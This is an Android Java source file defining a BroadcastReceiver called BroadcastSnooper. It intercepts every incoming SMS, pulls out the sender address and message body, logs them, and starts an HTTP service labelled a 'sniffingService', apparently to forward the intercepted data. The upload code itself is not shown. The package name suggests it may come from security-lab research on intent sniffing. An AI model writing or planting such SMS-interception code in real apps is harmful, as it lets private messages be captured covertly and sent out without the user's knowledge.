package com.isotlab.android.intentlogger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.preference.PreferenceManager;

public class BroadcastSnooper extends BroadcastReceiver{
	
	@SuppressLint("NewApi")
	@Override
	public void onReceive(Context context, Intent intent) {
		//---get the SMS message passed in---
        Bundle bundle = intent.getExtras();        
        SmsMessage[] msgs = null;
        String str = "";            
        if (bundle != null)
        {
            //---retrieve the SMS message received---
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];            
            for (int i=0; i<msgs.length; i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
                str += "SMS from " + msgs[i].getDisplayOriginatingAddress();                    
                str += " :";
                str += msgs[i].getMessageBody().toString();
                str += "\n";        
            }
           
            Log.d("Text Message: ", str);
            Intent sniffingService = new Intent(context, ServiceHttp.class);
            sniffingService.putExtra("IntentActivity", new IntentActivity(intent));
            context.startService(sniffingService);
            
        }                         
		
	}
}
